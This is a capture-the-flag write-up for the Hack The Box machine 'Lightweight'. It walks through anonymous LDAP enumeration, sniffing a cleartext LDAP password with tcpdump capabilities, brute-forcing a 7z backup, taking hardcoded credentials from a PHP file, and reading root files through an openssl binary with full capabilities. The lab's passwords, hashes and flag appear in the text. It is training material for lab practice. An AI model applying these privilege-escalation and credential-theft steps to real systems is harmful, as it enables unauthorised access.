# LIGHTWEIGHT

## NMAP

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/lightweight]
└─$ nmap 10.10.10.119
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-05 02:52 EDT
Nmap scan report for 10.10.10.119
Host is up (0.28s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
389/tcp open  ldap

Nmap done: 1 IP address (1 host up) scanned in 14.14 seconds
                                                                                                          
┌──(kali㉿kali)-[~/Downloads/hackthebox/lightweight]
└─$ nmap 10.10.10.119 -p 22,80,389 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-05 02:53 EDT
Nmap scan report for 10.10.10.119
Host is up (0.31s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 19:97:59:9a:15:fd:d2:ac:bd:84:73:c4:29:e9:2b:73 (RSA)
|   256 88:58:a1:cf:38:cd:2e:15:1d:2c:7f:72:06:a3:57:67 (ECDSA)
|_  256 31:6c:c1:eb:3b:28:0f:ad:d5:79:72:8f:f5:b5:49:db (ED25519)
80/tcp  open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
|_http-title: Lightweight slider evaluation page - slendr
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
| ssl-cert: Subject: commonName=lightweight.htb
| Subject Alternative Name: DNS:lightweight.htb, DNS:localhost, DNS:localhost.localdomain
| Not valid before: 2018-06-09T13:32:51
|_Not valid after:  2019-06-09T13:32:51
|_ssl-date: TLS randomness does not represent time
```

## PORT 389 LDAP

On doing a quick google search we find that ldap is `lightweight directory access protocol`. More about it's enumeration can be read [here](https://book.hacktricks.xyz/pentesting/pentesting-ldap)

I used a tool `ldapsearch` with null creds to look for more information.

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/lightweight]
└─$ ldapsearch -h 10.10.10.119 -x -b "dc=lightweight,dc=htb" -D '' -w ''                             34 ⨯
# extended LDIF
#
# LDAPv3
# base <dc=lightweight,dc=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# lightweight.htb
dn: dc=lightweight,dc=htb
objectClass: top
objectClass: dcObject
objectClass: organization
o: lightweight htb
dc: lightweight

# Manager, lightweight.htb
dn: cn=Manager,dc=lightweight,dc=htb
objectClass: organizationalRole
cn: Manager
description: Directory Manager

# People, lightweight.htb
dn: ou=People,dc=lightweight,dc=htb
objectClass: organizationalUnit
ou: People

# Group, lightweight.htb
dn: ou=Group,dc=lightweight,dc=htb
objectClass: organizationalUnit
ou: Group

# ldapuser1, People, lightweight.htb
dn: uid=ldapuser1,ou=People,dc=lightweight,dc=htb
uid: ldapuser1
cn: ldapuser1
sn: ldapuser1
mail: ldapuser1@lightweight.htb
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: top
objectClass: shadowAccount
userPassword:: e2NyeXB0fSQ2JDNxeDBTRDl4JFE5eTFseVFhRktweHFrR3FLQWpMT1dkMzNOd2R
 oai5sNE16Vjd2VG5ma0UvZy9aLzdONVpiZEVRV2Z1cDJsU2RBU0ltSHRRRmg2ek1vNDFaQS4vNDQv
shadowLastChange: 17691
shadowMin: 0
shadowMax: 99999
shadowWarning: 7
loginShell: /bin/bash
uidNumber: 1000
gidNumber: 1000
homeDirectory: /home/ldapuser1

# ldapuser2, People, lightweight.htb
dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb
uid: ldapuser2
cn: ldapuser2
sn: ldapuser2
mail: ldapuser2@lightweight.htb
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: top
objectClass: shadowAccount
userPassword:: e2NyeXB0fSQ2JHhKeFBqVDBNJDFtOGtNMDBDSllDQWd6VDRxejhUUXd5R0ZRdms
 zYm9heW11QW1NWkNPZm0zT0E3T0t1bkxaWmxxeXRVcDJkdW41MDlPQkUyeHdYL1FFZmpkUlF6Z24x
shadowLastChange: 17691
shadowMin: 0
shadowMax: 99999
shadowWarning: 7
loginShell: /bin/bash
uidNumber: 1001
gidNumber: 1001
homeDirectory: /home/ldapuser2

# ldapuser1, Group, lightweight.htb
dn: cn=ldapuser1,ou=Group,dc=lightweight,dc=htb
objectClass: posixGroup
objectClass: top
cn: ldapuser1
userPassword:: e2NyeXB0fXg=
gidNumber: 1000

# ldapuser2, Group, lightweight.htb
dn: cn=ldapuser2,ou=Group,dc=lightweight,dc=htb
objectClass: posixGroup
objectClass: top
cn: ldapuser2
userPassword:: e2NyeXB0fXg=
gidNumber: 1001

# search result
search: 2
result: 0 Success

# numResponses: 9
# numEntries: 8
```

The userpassword is base64 encoded decrypting them.

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/lightweight]
└─$ echo "e2NyeXB0fSQ2JHhKeFBqVDBNJDFtOGtNMDBDSllDQWd6VDRxejhUUXd5R0ZRdmszYm9heW11QW1NWkNPZm0zT0E3T0t1bkxaWmxxeXRVcDJkdW41MDlPQkUyeHdYL1FFZmpkUlF6Z24x" | base64 -d      
{crypt}$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1 
```

It looked like a hash so I tried to crack it using john but I couldn't.

## WEBSITE

![](https://github.com/Leo-2807/Writeups/blob/main/images/light1.png)

This clearly says we cannot use bruteforcing tools.

### INFO

![](https://github.com/Leo-2807/Writeups/blob/main/images/light2.png)

The last line says to check the user page to get into the box.

### USER

![](https://github.com/Leo-2807/Writeups/blob/main/images/light3.png)

This says that we can ssh into the machine using our ip as username and password.

## SSH

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/lightweight]
└─$ ssh 10.10.14.2@10.10.10.119
The authenticity of host '10.10.10.119 (10.10.10.119)' can't be established.
ECDSA key fingerprint is SHA256:FWyyew+o9WoPYkfIKGEbTMsexks1z8ZkSUs9O+2AMSU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.119' (ECDSA) to the list of known hosts.
10.10.14.2@10.10.10.119's password: 
Last login: Fri Nov 16 22:39:02 2018 from 10.10.14.2
[10.10.14.2@lightweight ~]$ whoami
10.10.14.2
[10.10.14.2@lightweight ~]$ id
uid=1002(10.10.14.2) gid=1002(10.10.14.2) groups=1002(10.10.14.2) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

I used linpeas to look for vulnerbilities to exploit. 

```bash
╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                    
Current capabilities:                                                                                                                                         
Current: =
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000001fffffffff
CapAmb: 0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000001fffffffff
CapAmb: 0000000000000000

Files with capabilities (limited to 50):
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/sbin/mtr = cap_net_raw+ep
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
```

I google searched more about capabilities and how they can be exploited for privledge escalation. This [article](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities) helps alot.

![](https://github.com/Leo-2807/Writeups/blob/main/images/light4.png)

Tcpdump have both these capabilities so we can run that to capture packets from the ldap port.

```bash
[10.10.14.2@lightweight ~]$ tcpdump -i lo -nnXs 0 'port 389'
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
...snip...
13:10:49.993535 IP 10.10.10.119.35356 > 10.10.10.119.389: Flags [P.], seq 1:92, ack 1, win 683, options [nop,nop,TS val 3256442 ecr 3256441], length 91
        0x0000:  4500 008f b478 4000 4006 5cef 0a0a 0a77  E....x@.@.\....w
        0x0010:  0a0a 0a77 8a1c 0185 4426 0410 aed9 560d  ...w....D&....V.
        0x0020:  8018 02ab 2983 0000 0101 080a 0031 b07a  ....)........1.z
        0x0030:  0031 b079 3059 0201 0160 5402 0103 042d  .1.y0Y...`T....-
        0x0040:  7569 643d 6c64 6170 7573 6572 322c 6f75  uid=ldapuser2,ou
        0x0050:  3d50 656f 706c 652c 6463 3d6c 6967 6874  =People,dc=light
        0x0060:  7765 6967 6874 2c64 633d 6874 6280 2038  weight,dc=htb..8
        0x0070:  6263 3832 3531 3333 3261 6265 3164 3766  bc8251332abe1d7f
        0x0080:  3130 3564 3365 3533 6164 3339 6163 32    105d3e53ad39ac2
```


There was a ldap login request from user `ldapuser2` and it had his password.

```bash
[10.10.14.2@lightweight ~]$ su ldapuser2
Password: 
[ldapuser2@lightweight 10.10.14.2]$ id
uid=1001(ldapuser2) gid=1001(ldapuser2) groups=1001(ldapuser2) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[ldapuser2@lightweight ~]$ ls
backup.7z  OpenLDAP-Admin-Guide.pdf  OpenLdap.pdf  user.txt 
```

We can read user.txt now.

## PRIVESEC

I downloaded the backup file on my machine and tried to open it.
It is password protected. After looking for some time I found this [tool](https://github.com/FreddieOliveira/bruteZip/blob/master/bruteZip.sh).

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/lightweight]
└─$ ./brute_7z.sh backup.7z /usr/share/wordlists/rockyou.txt                                                                                                         1 ⨯

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs 11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz (806C1),ASM)

Scanning the drive for archives:
1 file, 3411 bytes (4 KiB)

Listing archive: backup.7z

--
Path = backup.7z
Type = 7z
Physical Size = 3411
Headers Size = 259
Method = LZMA2:12k 7zAES
Solid = +
Blocks = 1

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2018-06-13 14:48:41 ....A         4218         3152  index.php
2018-06-13 14:47:14 ....A         1764               info.php
2018-06-10 11:08:57 ....A          360               reset.php
2018-06-14 15:06:33 ....A         2400               status.php
2018-06-13 14:47:46 ....A         1528               user.php
------------------- ----- ------------ ------------  ------------------------
2018-06-14 15:06:33              10270         3152  5 files

Starting brute forcing
2054/14344393 (0%) Trying: "delete"e"""r""
FOUND! Archive password is: "delete"

Tried 2054 passwords
```
Now we can unzip the archive.

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/lightweight/backup]
└─$ 7z e backup.7z

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs 11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz (806C1),ASM)

Scanning the drive for archives:
1 file, 3411 bytes (4 KiB)

Extracting archive: backup.7z
--
Path = backup.7z
Type = 7z
Physical Size = 3411
Headers Size = 259
Method = LZMA2:12k 7zAES
Solid = +
Blocks = 1

    
Enter password (will not be echoed):
Everything is Ok

Files: 5
Size:       10270
Compressed: 3411
                                                                                                                                                                         
┌──(kali㉿kali)-[~/Downloads/hackthebox/lightweight/backup]
└─$ la
backup.7z  index.php  info.php  reset.php  status.php  user.php
```

Reading the files I found the creds for ldapuser1 in status.php.

```bash
$username = 'ldapuser1';
$password = 'f3ca9d298a553da117442deeb6fa932d';
$ldapconfig['host'] = 'lightweight.htb';
$ldapconfig['port'] = '389';
$ldapconfig['basedn'] = 'dc=lightweight,dc=htb';
//$ldapconfig['usersdn'] = 'cn=users';
$ds=ldap_connect($ldapconfig['host'], $ldapconfig['port']);
ldap_set_option($ds, LDAP_OPT_PROTOCOL_VERSION, 3);
ldap_set_option($ds, LDAP_OPT_REFERRALS, 0);
ldap_set_option($ds, LDAP_OPT_NETWORK_TIMEOUT, 10);

$dn="uid=ldapuser1,ou=People,dc=lightweight,dc=htb";
```

```bash
[ldapuser2@lightweight ~]$ su ldapuser1
Password: 
[ldapuser1@lightweight ldapuser2]$ cd ~
[ldapuser1@lightweight ~]$ ls -la
total 1496
drwx------. 4 ldapuser1 ldapuser1    181 Sep 27 13:22 .
drwxr-xr-x. 6 root      root          75 Sep 27 13:22 ..
lrwxrwxrwx. 1 root      root           9 Sep 27 13:22 .bash_history -> /dev/null
-rw-r--r--. 1 ldapuser1 ldapuser1     18 Apr 11  2018 .bash_logout
-rw-r--r--. 1 ldapuser1 ldapuser1    193 Apr 11  2018 .bash_profile
-rw-r--r--. 1 ldapuser1 ldapuser1    246 Jun 15  2018 .bashrc
drwxrwxr-x. 3 ldapuser1 ldapuser1     18 Jun 11  2018 .cache
-rw-rw-r--. 1 ldapuser1 ldapuser1   9714 Jun 15  2018 capture.pcap
drwxrwxr-x. 3 ldapuser1 ldapuser1     18 Jun 11  2018 .config
-rw-rw-r--. 1 ldapuser1 ldapuser1    646 Jun 15  2018 ldapTLS.php
-rwxr-xr-x. 1 ldapuser1 ldapuser1 555296 Jun 13  2018 openssl
-rwxr-xr-x. 1 ldapuser1 ldapuser1 942304 Jun 13  2018 tcpdump
```

The interesting files are the two binaries `openssl and tcpdump` in the home directory.

Since previously we used the capabilities of tcpdump I thought maybe that's we can use them again. I used getcap to check for capabilities.

```bash
[ldapuser1@lightweight ~]$ getcap -r .
./tcpdump = cap_net_admin,cap_net_raw+ep                              
./openssl =ep 
```

A quick search led me to this [article](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities)

According to the article this capability means openssl have all the permissions.
If openssl have all the permission then it can be used to read root files.

```bash
[ldapuser1@lightweight ~]$ ./openssl enc -in /root/root.txt -out ./root.txt
[ldapuser1@lightweight ~]$ cat root.txt
5efdbec3c5ffaaaeca73e7ccbcf65555
```

And we got the root flag.